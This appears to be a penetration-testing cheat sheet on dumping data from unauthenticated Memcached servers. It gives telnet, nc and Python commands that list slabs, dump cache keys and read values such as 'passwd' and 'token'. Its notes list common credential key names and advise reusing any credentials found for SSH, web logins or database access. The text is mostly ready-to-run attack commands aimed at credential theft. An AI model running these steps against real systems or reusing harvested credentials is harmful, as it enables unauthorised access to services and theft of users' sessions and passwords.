# Memcached Credential Dump

Memcached (default port 11211) has no authentication. If accessible (locally or externally), all cached data can be read via the text protocol using telnet or nc. Applications often store session tokens, credentials, or sensitive data in the cache.

## Connect and Enumerate

```bash
# Connect via telnet
telnet 127.0.0.1 11211

# Or via nc
nc 127.0.0.1 11211

# Check version
version

# List slabs (memory allocation groups)
stats slabs

# Dump keys from a slab (x = slab ID, 0 = all keys)
stats cachedump <slab_id> 0
# Example: stats cachedump 1 0
# Output: ITEM key [size; expiry]
```

## Read Values

```bash
# Get a specific key
get <key_name>
# Example: get passwd
# Returns the cached value

# Get multiple keys
get user passwd token
```

## Automated Enumeration

```bash
# Dump all slabs and keys
echo "stats slabs" | nc 127.0.0.1 11211
echo "stats cachedump 1 0" | nc 127.0.0.1 11211

# Python one-liner to dump all items from slab 1
python3 -c "
import socket
s = socket.socket()
s.connect(('127.0.0.1', 11211))
s.send(b'stats cachedump 1 0\r\n')
print(s.recv(4096).decode())
"
```

## Notes
- Default port: 11211; listens on 127.0.0.1 by default (check netstat/ss for local services)
- No auth — all data readable without credentials
- Common keys: `user`, `passwd`, `token`, `session`, `password`, `email`
- Misconfigured instances exposed on 0.0.0.0:11211 can be reached directly
- If credentials found, try them for SSH, web logins, or database access
